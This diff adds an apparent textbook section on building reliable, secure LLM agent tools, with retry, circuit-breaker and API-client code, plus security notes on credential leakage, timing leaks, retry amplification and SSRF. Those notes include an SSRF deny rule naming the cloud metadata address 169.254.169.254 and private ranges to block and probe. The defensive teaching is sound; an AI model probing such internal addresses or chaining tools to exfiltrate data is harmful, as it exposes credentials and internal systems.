+              max_delay: float = 60.0
+          ):
+              for attempt in range(max_retries):
+                  try:
+                      return await func()
+                  except TransientError as e:
+                      if attempt == max_retries - 1:
+                          raise
+                      
+                      # Calculate delay: base * 2^attempt with jitter
+                      delay = min(base_delay * (2 ** attempt), max_delay)
+                      jitter = random.uniform(0, delay * 0.1)
+                      
+                      await asyncio.sleep(delay + jitter)
+```
+          
+          Why exponential backoff:
+          - Gives failing system time to recover
+          - Reduces thundering herd problem
+          - Jitter prevents synchronized retries
+          - Adaptive to severity (more attempts = longer waits)
+        
+        retry_conditions: |
+          When to retry vs when to fail immediately:
+          
+          **Retry** (transient failures):
+          - Network timeouts
+          - 5xx server errors (500, 502, 503, 504)
+          - Rate limit errors (429)
+          - Connection refused (if temporary)
+          
+          **Don't retry** (permanent failures):
+          - 4xx client errors (400, 401, 403, 404)
+          - Invalid parameters
+          - Authentication failures
+          - Malformed requests
+```python
+          def should_retry(exception: Exception) -> bool:
+              if isinstance(exception, httpx.TimeoutException):
+                  return True
+              if isinstance(exception, httpx.HTTPStatusError):
+                  return exception.response.status_code >= 500
+              if isinstance(exception, RateLimitError):
+                  return True
+              return False
+```
+        
+        circuit_breaker_pattern: |
+          Circuit breaker prevents cascading failures:
+          
+          States:
+          - **Closed**: Normal operation, requests pass through
+          - **Open**: Too many failures, reject requests immediately
+          - **Half-open**: Testing if service recovered
+```python
+          class CircuitBreaker:
+              def __init__(self, failure_threshold: int = 5, timeout: int = 60):
+                  self.failure_threshold = failure_threshold
+                  self.timeout = timeout
+                  self.failures = 0
+                  self.state = "closed"
+                  self.opened_at = None
+              
+              async def call(self, func: Callable):
+                  if self.state == "open":
+                      if time.time() - self.opened_at > self.timeout:
+                          self.state = "half-open"
+                      else:
+                          raise CircuitOpenError("Circuit breaker is open")
+                  
+                  try:
+                      result = await func()
+                      
+                      # Success - reset failures
+                      if self.state == "half-open":
+                          self.state = "closed"
+                      self.failures = 0
+                      
+                      return result
+                  
+                  except Exception as e:
+                      self.failures += 1
+                      
+                      if self.failures >= self.failure_threshold:
+                          self.state = "open"
+                          self.opened_at = time.time()
+                      
+                      raise
+```
+      
+      error_handling:
+        error_categorization: |
+          Categorize errors for appropriate handling:
+          
+          1. **Network errors**: Timeout, connection refused
+             - Action: Retry with backoff
+             - User message: "Service temporarily unavailable"
+          
+          2. **Authentication errors**: Invalid credentials
+             - Action: Fail immediately, alert admin
+             - User message: "Authentication failed, please contact support"
+          
+          3. **Rate limit errors**: Too many requests
+             - Action: Exponential backoff, respect Retry-After header
+             - User message: "Please try again in a few moments"
+          
+          4. **Validation errors**: Bad input
+             - Action: Return validation error to LLM for correction
+             - User message: Include specific validation error
+          
+          5. **Server errors**: Internal server error
+             - Action: Retry, log for investigation
+             - User message: "Service error, retrying..."
+        
+        error_messages_for_llm: |
+          Error messages should help LLM correct mistakes:
+          
+          **Bad error message**:
+```
+          "Error: 400"
+```
+          LLM has no idea what went wrong.
+          
+          **Good error message**:
+```
+          "Parameter 'date' is invalid. Expected format: YYYY-MM-DD. 
+           Received: '2024/01/01'. Example: '2024-01-01'"
+```
+          LLM can fix the format and retry.
+          
+          Guidelines:
+          - Be specific about what's wrong
+          - Include expected format/values
+          - Provide examples
+          - Suggest corrections
+          - Don't leak sensitive information
+        
+        graceful_degradation: |
+          When tools fail, degrade gracefully:
+```python
+          async def search_with_fallback(query: str) -> ToolResult:
+              try:
+                  # Try primary search API
+                  return await primary_search_api.search(query)
+              except APIError:
+                  try:
+                      # Fall back to secondary API
+                      return await secondary_search_api.search(query)
+                  except APIError:
+                      # Fall back to cached results
+                      cached = cache.get(query)
+                      if cached:
+                          return ToolResult(
+                              success=True,
+                              data=cached,
+                              metadata={"source": "cache", "warning": "Using cached results due to API failure"}
+                          )
+                      
+                      # Ultimate fallback
+                      return ToolResult(
+                          success=False,
+                          error="All search services unavailable",
+                          data=None
+                      )
+```
+    
+    implementation:
+      robust_api_tool:
+        language: python
+        code: |
+          """
+          Production-grade API tool with authentication, retry logic, and error handling.
+          Demonstrates patterns for reliable external API integration.
+          """
+          
+          import asyncio
+          import httpx
+          import time
+          import random
+          from typing import Dict, Optional, Callable, Any
+          from dataclasses import dataclass
+          from enum import Enum
+          
+          class CircuitState(Enum):
+              """Circuit breaker states."""
+              CLOSED = "closed"
+              OPEN = "open"
+              HALF_OPEN = "half_open"
+          
+          
+          @dataclass
+          class RetryConfig:
+              """Configuration for retry logic."""
+              max_retries: int = 3
+              base_delay: float = 1.0
+              max_delay: float = 60.0
+              exponential_base: float = 2.0
+              jitter: bool = True
+          
+          
+          class CircuitBreaker:
+              """Circuit breaker for API calls."""
+              
+              def __init__(self, 
+                          failure_threshold: int = 5,
+                          recovery_timeout: int = 60):
+                  """
+                  Initialize circuit breaker.
+                  
+                  Args:
+                      failure_threshold: Failures before opening circuit
+                      recovery_timeout: Seconds before trying half-open
+                  """
+                  self.failure_threshold = failure_threshold
+                  self.recovery_timeout = recovery_timeout
+                  self.failures = 0
+                  self.state = CircuitState.CLOSED
+                  self.opened_at: Optional[float] = None
+              
+              def call_allowed(self) -> bool:
+                  """Check if calls are allowed."""
+                  if self.state == CircuitState.CLOSED:
+                      return True
+                  
+                  if self.state == CircuitState.OPEN:
+                      # Check if timeout expired
+                      if time.time() - self.opened_at >= self.recovery_timeout:
+                          self.state = CircuitState.HALF_OPEN
+                          return True
+                      return False
+                  
+                  # Half-open: allow one test call
+                  return True
+              
+              def record_success(self):
+                  """Record successful call."""
+                  self.failures = 0
+                  if self.state == CircuitState.HALF_OPEN:
+                      self.state = CircuitState.CLOSED
+              
+              def record_failure(self):
+                  """Record failed call."""
+                  self.failures += 1
+                  
+                  if self.failures >= self.failure_threshold:
+                      self.state = CircuitState.OPEN
+                      self.opened_at = time.time()
+          
+          
+          class RobustAPITool:
+              """
+              Production-grade API tool with comprehensive error handling.
+              
+              Features:
+              - Authentication (API key and OAuth2)
+              - Exponential backoff retry
+              - Circuit breaker
+              - Request/response logging
+              - Timeout handling
+              """
+              
+              def __init__(self,
+                          base_url: str,
+                          api_key: Optional[str] = None,
+                          retry_config: Optional[RetryConfig] = None,
+                          timeout: float = 30.0):
+                  """
+                  Initialize API tool.
+                  
+                  Args:
+                      base_url: API base URL
+                      api_key: Optional API key for authentication
+                      retry_config: Retry configuration
+                      timeout: Request timeout in seconds
+                  """
+                  self.base_url = base_url.rstrip('/')
+                  self.api_key = api_key
+                  self.retry_config = retry_config or RetryConfig()
+                  self.timeout = timeout
+                  
+                  # Circuit breaker per endpoint
+                  self.circuit_breakers: Dict[str, CircuitBreaker] = {}
+                  
+                  # HTTP client
+                  self.client = httpx.AsyncClient(
+                      timeout=httpx.Timeout(timeout),
+                      follow_redirects=True
+                  )
+              
+              def get_headers(self) -> Dict[str, str]:
+                  """Get request headers with authentication."""
+                  headers = {
+                      "Content-Type": "application/json",
+                      "User-Agent": "LLM-Agent/1.0"
+                  }
+                  
+                  if self.api_key:
+                      headers["Authorization"] = f"Bearer {self.api_key}"
+                  
+                  return headers
+              
+              def get_circuit_breaker(self, endpoint: str) -> CircuitBreaker:
+                  """Get or create circuit breaker for endpoint."""
+                  if endpoint not in self.circuit_breakers:
+                      self.circuit_breakers[endpoint] = CircuitBreaker()
+                  return self.circuit_breakers[endpoint]
+              
+              def should_retry(self, 
+                             exception: Exception,
+                             attempt: int) -> bool:
+                  """
+                  Determine if request should be retried.
+                  
+                  Args:
+                      exception: Exception that occurred
+                      attempt: Current attempt number
+                  
+                  Returns:
+                      True if should retry
+                  """
+                  if attempt >= self.retry_config.max_retries:
+                      return False
+                  
+                  # Retry on network errors
+                  if isinstance(exception, (httpx.TimeoutException, httpx.NetworkError)):
+                      return True
+                  
+                  # Retry on 5xx errors
+                  if isinstance(exception, httpx.HTTPStatusError):
+                      status = exception.response.status_code
+                      return status >= 500
+                  
+                  return False
+              
+              def calculate_delay(self, attempt: int) -> float:
+                  """
+                  Calculate retry delay with exponential backoff.
+                  
+                  Args:
+                      attempt: Current attempt number (0-indexed)
+                  
+                  Returns:
+                      Delay in seconds
+                  """
+                  config = self.retry_config
+                  
+                  # Exponential backoff
+                  delay = config.base_delay * (config.exponential_base ** attempt)
+                  delay = min(delay, config.max_delay)
+                  
+                  # Add jitter
+                  if config.jitter:
+                      jitter = random.uniform(0, delay * 0.1)
+                      delay += jitter
+                  
+                  return delay
+              
+              async def request(self,
+                              method: str,
+                              endpoint: str,
+                              params: Optional[Dict] = None,
+                              json_data: Optional[Dict] = None) -> Dict:
+                  """
+                  Make API request with retry logic and circuit breaker.
+                  
+                  Args:
+                      method: HTTP method
+                      endpoint: API endpoint
+                      params: Query parameters
+                      json_data: JSON request body
+                  
+                  Returns:
+                      Response JSON
+                  
+                  Raises:
+                      Exception if all retries fail
+                  """
+                  url = f"{self.base_url}/{endpoint.lstrip('/')}"
+                  headers = self.get_headers()
+                  
+                  # Check circuit breaker
+                  circuit = self.get_circuit_breaker(endpoint)
+                  if not circuit.call_allowed():
+                      raise Exception(f"Circuit breaker OPEN for endpoint: {endpoint}")
+                  
+                  # Retry loop
+                  last_exception = None
+                  
+                  for attempt in range(self.retry_config.max_retries + 1):
+                      try:
+                          # Make request
+                          response = await self.client.request(
+                              method=method,
+                              url=url,
+                              headers=headers,
+                              params=params,
+                              json=json_data
+                          )
+                          
+                          # Raise for 4xx/5xx status codes
+                          response.raise_for_status()
+                          
+                          # Success
+                          circuit.record_success()
+                          return response.json()
+                      
+                      except Exception as e:
+                          last_exception = e
+                          
+                          # Check if should retry
+                          if not self.should_retry(e, attempt):
+                              circuit.record_failure()
+                              raise
+                          
+                          # Calculate delay
+                          if attempt < self.retry_config.max_retries:
+                              delay = self.calculate_delay(attempt)
+                              print(f"Request failed (attempt {attempt + 1}), retrying in {delay:.2f}s...")
+                              await asyncio.sleep(delay)
+                  
+                  # All retries exhausted
+                  circuit.record_failure()
+                  raise last_exception
+              
+              async def get(self, endpoint: str, params: Optional[Dict] = None) -> Dict:
+                  """Make GET request."""
+                  return await self.request("GET", endpoint, params=params)
+              
+              async def post(self, endpoint: str, json_data: Dict) -> Dict:
+                  """Make POST request."""
+                  return await self.request("POST", endpoint, json_data=json_data)
+              
+              async def close(self):
+                  """Close HTTP client."""
+                  await self.client.aclose()
+          
+          
+          async def demonstrate_robust_api_tool():
+              """Demonstrate robust API tool with error handling."""
+              print("\n" + "="*80)
+              print("ROBUST API TOOL DEMONSTRATION")
+              print("="*80)
+              
+              # Note: This uses httpbin.org for demonstration
+              # In production, replace with your actual API
+              
+              tool = RobustAPITool(
+                  base_url="https://httpbin.org",
+                  retry_config=RetryConfig(max_retries=3, base_delay=0.5)
+              )
+              
+              try:
+                  # Test successful request
+                  print("\n" + "-"*80)
+                  print("TEST 1: Successful request")
+                  print("-"*80)
+                  
+                  result = await tool.get("/get", params={"test": "value"})
+                  print(f"Success! Args: {result.get('args', {})}")
+                  
+                  # Test retry on 500 error
+                  print("\n" + "-"*80)
+                  print("TEST 2: Simulating 500 error (will retry)")
+                  print("-"*80)
+                  
+                  try:
+                      # httpbin returns 500 when you request /status/500
+                      result = await tool.get("/status/500")
+                  except Exception as e:
+                      print(f"Failed after retries: {type(e).__name__}")
+                  
+                  # Test circuit breaker
+                  print("\n" + "-"*80)
+                  print("TEST 3: Circuit breaker")
+                  print("-"*80)
+                  
+                  # Trigger multiple failures to open circuit
+                  for i in range(6):
+                      try:
+                          await tool.get("/status/500")
+                      except Exception:
+                          pass
+                  
+                  # Circuit should now be open
+                  try:
+                      await tool.get("/get")
+                  except Exception as e:
+                      print(f"Circuit breaker activated: {str(e)}")
+                  
+                  print("\n" + "-"*80)
+                  print("Circuit breaker states:")
+                  for endpoint, cb in tool.circuit_breakers.items():
+                      print(f"  {endpoint}: {cb.state.value} (failures: {cb.failures})")
+              
+              finally:
+                  await tool.close()
+          
+          
+          if __name__ == "__main__":
+              asyncio.run(demonstrate_robust_api_tool())
+    
+    security_implications:
+      credential_exposure_in_errors: |
+        **Vulnerability**: Credentials can leak through detailed error messages or logs
+        that include full request details.
+        
+        **Attack scenario**: Error message includes:
+```
+        "Request to https://api.example.com?api_key=sk_live_ABC123&data=sensitive failed"
+```
+        
+        This error is logged, shown to user, or included in LLM response, exposing API key.
+        
+        **Defense**:
+        1. Error sanitization: Strip credentials from all error messages
+        2. Separate logging: Log full details (with creds) only to secure audit log
+        3. User-facing errors: Generic messages without request details
+        4. Regex filtering: Automatically detect and redact credential patterns
+        5. LLM response filtering: Scan responses for credential leakage
+        6. Structured logging: Separate sensitive fields from logged data
+      
+      timing_attacks_on_rate_limiting: |
+        **Vulnerability**: Rate limiting timing can leak information about API usage
+        patterns or enable timing-based attacks.
+        
+        **Attack scenario**: Attacker measures time to get rate limit error. If immediate,
+        rate limit already hit (someone else using system heavily). If delayed, rate limit
+        not hit yet. This leaks information about other users' activity.
+        
+        Or: Attacker uses timing to enumerate valid vs invalid endpoints.
+        
+        **Defense**:
+        1. Consistent timing: Always take same time to check rate limit
+        2. Random delays: Add random delays to prevent timing analysis
+        3. Batch responses: Don't immediately return rate limit errors
+        4. Generic errors: Don't distinguish between rate limits and other errors in timing
+      
+      retry_amplification_attacks: |
+        **Vulnerability**: Aggressive retry logic can amplify attacks, causing thundering
+        herd problems or excessive load on downstream services.
+        
+        **Attack scenario**: Attacker triggers many requests that cause retries. With 3
+        retries each, 100 malicious requests become 400 requests to downstream service,
+        potentially causing DoS.
+        
+        Or: Many agents retry simultaneously after service recovers, overwhelming it again.
+        
+        **Defense**:
+        1. Max retry limits: Cap total retries across all requests
+        2. Exponential backoff: Longer waits between retries
+        3. Jitter: Randomize retry timing to prevent synchronization
+        4. Circuit breakers: Stop retrying when system is down
+        5. Rate limiting: Limit retries per time period
+        6. Queue management: Queue retries instead of executing immediately
+
+key_takeaways:
+  critical_concepts:
+    - concept: "Tool abstraction layer provides unified interface for diverse external systems (REST APIs, databases, file systems)"
+      why_it_matters: "Enables LLMs to work with any tool through consistent interface. Registry handles authorization, monitoring, rate limiting centrally."
+    
+    - concept: "Production tools require robust error handling: retry logic, circuit breakers, graceful degradation"
+      why_it_matters: "External systems fail. Network errors, API outages, rate limits happen constantly in production. Robust error handling is reliability."
+    
+    - concept: "Authentication and credential management must be secure: no hardcoding, use secret managers, sanitize errors"
+      why_it_matters: "Credential leakage is catastrophic. One exposed API key can compromise entire system. Security-first credential handling is essential."
+    
+    - concept: "SSRF and data exfiltration are major risks when giving LLMs access to external systems"
+      why_it_matters: "LLMs can be manipulated to access internal systems or exfiltrate data through tool chaining. Defense-in-depth required."
+  
+  actionable_steps:
+    - step: "Implement tool registry with per-tool access control and rate limiting"
+      verification: "Test access control (unauthorized users blocked), rate limiting (excess calls rejected), metrics collection (usage tracked)."
+    
+    - step: "Use exponential backoff retry with jitter for all external API calls, circuit breakers for systemic failures"
+      verification: "Simulate API failures. Retries should happen with increasing delays. Circuit should open after threshold."
+    
+    - step: "Store credentials in secret manager, never in code. Sanitize all errors and logs to remove credentials"
+      verification: "Scan codebase for hardcoded secrets. Review logs and error messages for credential patterns."
+    
+    - step: "Implement SSRF protection: whitelist URLs, blacklist private IPs, validate domains before requests"
+      verification: "Attempt to access internal IPs (169.254.169.254, 10.0.0.0/8). Should be blocked."
+  
+  security_principles:
+    - principle: "Defense-in-depth for tool execution: validate inputs, authorize access, sanitize outputs, monitor usage"
+      application: "Multiple security layers. Input validation, permission checks, output filtering, audit logging."
+    
+    - principle: "Principle of least privilege for tool credentials: each tool gets minimal necessary permissions"
+      application: "Separate API keys per tool, read-only where possible, scoped to specific resources only."
+    
+    - principle: "Fail securely: sanitize errors, don't leak credentials, provide generic user messages"
+      application: "Error messages safe for users. Detailed errors only in secure audit logs. No credential exposure."
+    
+    - principle: "Monitor and alert on anomalies: unusual tool combinations, high failure rates, credential access"
+      application: "Track tool usage patterns. Alert on data exfiltration attempts, SSRF probing, credential errors."
+  
+  common_mistakes:
+    - mistake: "Hardcoded API keys in code or configuration files"
+      fix: "Use environment variables (minimum) or secret manager (better). Rotate keys regularly."
+    
+    - mistake: "No retry logic, causing brittle tools that fail on transient network errors"
+      fix: "Implement exponential backoff retry for transient failures. Use circuit breakers for systemic failures."
+    
+    - mistake: "Detailed error messages that leak credentials, internal URLs, or system architecture"
+      fix: "Sanitize all errors. Generic messages for users, detailed logs only in secure audit system."
+    
+    - mistake: "No SSRF protection, allowing access to internal networks and cloud metadata"
+      fix: "Whitelist allowed domains, blacklist private IPs, validate DNS resolution. Block 169.254.169.254 explicitly."
+    
+    - mistake: "No access control on tools, any user can call any tool"
+      fix: "Implement per-user tool whitelisting. Default deny, explicit allow."
+  
+  integration_with_book:
+    from_section_4_7:
+      - "Function calling (4.7) provides the foundation: JSON schemas and parameter validation"
+      - "Tool use (4.8) implements real external integrations on top of function calling framework"
+      - "Same validation and security principles apply to both"
+    
+    to_next_section:
+      - "Section 4.9: ReAct combines reasoning with iterative tool calling"
+      - "Tools from 4.8 become actions in ReAct loops"
+      - "Error handling from 4.8 enables robust multi-step workflows"
+  
+  looking_ahead:
+    next_concepts:
+      - "ReAct agents with reasoning and multi-step tool use (4.9)"
+      - "Complex agent architectures orchestrating many tools (4.10)"
+      - "Production deployment with tool versioning and monitoring (4.12-4.17)"
+      - "Continuous improvement through tool usage analytics"
+    
+    skills_to_build:
+      - "Designing robust tool interfaces for specific domains"
+      - "Implementing comprehensive monitoring and alerting"
+      - "Building tool composition and workflow patterns"
+      - "Creating tool versioning and deprecation strategies"
+  
+  final_thoughts: |
+    Tool use transforms LLM agents from demos to production systems. Sections 4.7-4.8
+    built the complete foundation: function calling architecture (4.7) and real external
+    integration (4.8). LLMs can now take real actions: query databases, call APIs, fetch
+    web content, manipulate files.
+    
+    Key insights:
+    
+    1. **Abstraction enables scale**: Tool abstraction layer allows treating all external
+       systems uniformly. Add new tools without changing core agent logic. Registry manages
+       access control, monitoring, and execution centrally.
+    
+    2. **Error handling is reliability**: External systems fail constantly. Retry logic,
+       circuit breakers, and graceful degradation are not optional—they're essential for
+       production. Build robustness in from day one.
+    
+    3. **Security is critical**: Tools bridge LLM reasoning with real-world systems. SSRF,
+       credential leakage, and data exfiltration are severe risks. Every tool is a potential
+       vulnerability requiring comprehensive security controls.
+    
+    4. **Authentication is complex**: Different APIs, different auth methods, session
+       management, credential rotation. Getting this right requires dedicated infrastructure—
+       secret managers, OAuth handlers, secure error handling.
+    
+    5. **Start simple, expand carefully**: Begin with a few well-tested, low-risk tools.
+       Validate security and reliability before adding more. Each tool expands attack surface
+       and complexity.
+    
+    Moving forward, Section 4.9 combines tools with reasoning in ReAct loops: LLMs observe
+    tool results, reason about next steps, call more tools iteratively. This enables complex
+    multi-step workflows where agents autonomously accomplish tasks by reasoning and acting.
+    
+    Remember: Tool use is where agents meet reality. Build secure, reliable foundations
+    now, or face production incidents later when agents are calling APIs at scale.
+
+---
